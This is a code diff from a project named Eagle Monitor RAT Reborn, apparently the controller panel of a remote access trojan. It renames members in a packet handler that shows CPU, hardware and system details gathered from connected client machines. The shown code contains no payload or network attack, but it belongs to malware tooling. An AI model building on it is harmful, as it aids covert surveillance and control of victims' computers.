@@ -16,30 +16,30 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
         {
             try
             {
-                ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.BeginInvoke((MethodInvoker)(() =>
+                ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.BeginInvoke((MethodInvoker)(() =>
                 {
-                    ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows.Clear();
-                    ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.componentsDataGridView.Rows.Clear();
-                    ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.systemInformationDataGridView.Rows.Clear();
+                    ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows.Clear();
+                    ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.componentsDataGridView.Rows.Clear();
+                    ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.systemInformationDataGridView.Rows.Clear();
 
                     string[] cpuFeatures = informationPacket.information.hardwareInformation.cpuInformation["CPU"][0].Split('\n');
 
-                    int rowIdName = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows.Add();
+                    int rowIdName = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows.Add();
 
-                    DataGridViewRow row = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows[rowIdName];
+                    DataGridViewRow row = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows[rowIdName];
                     row.Cells["Column36"].Value = cpuFeatures[0];
 
-                    int rowIdVendor = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows.Add();
+                    int rowIdVendor = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows.Add();
 
-                    row = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows[rowIdVendor];
+                    row = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows[rowIdVendor];
                     row.Cells["Column36"].Value = cpuFeatures[1];
 
                     for (int i = 2; i < cpuFeatures.Length - 1; i++)
                     {
                         string[] SplitFeature = cpuFeatures[i].Split(' ');
-                        int rowId = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows.Add();
+                        int rowId = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows.Add();
 
-                        row = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.cpuDataGridView.Rows[rowId];
+                        row = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.cpuDataGridView.Rows[rowId];
                         row.Cells["Column36"].Value = SplitFeature[0];
 
 
@@ -51,16 +51,16 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
 
                     foreach (KeyValuePair<string, string> hardware in informationPacket.information.hardwareInformation.hardwareInformation)
                     {
-                        int rowId = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.componentsDataGridView.Rows.Add();
-                        row = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.componentsDataGridView.Rows[rowId];
+                        int rowId = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.componentsDataGridView.Rows.Add();
+                        row = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.componentsDataGridView.Rows[rowId];
                         row.Cells["Column38"].Value = hardware.Key;
                         row.Cells["Column39"].Value = hardware.Value;
                     }
 
                     foreach (KeyValuePair<string, string> system in informationPacket.information.systemInformation.systemInformation)
                     {
-                        int rowId = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.systemInformationDataGridView.Rows.Add();
-                        row = ClientHandler.ClientHandlersList[informationPacket.baseIp].clientForm.systemInformationDataGridView.Rows[rowId];
+                        int rowId = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.systemInformationDataGridView.Rows.Add();
+                        row = ClientHandler.ClientHandlersList[informationPacket.BaseIp].ClientForm.systemInformationDataGridView.Rows[rowId];
                         row.Cells["Column40"].Value = system.Key;
                         row.Cells["Column41"].Value = system.Value;
                     }
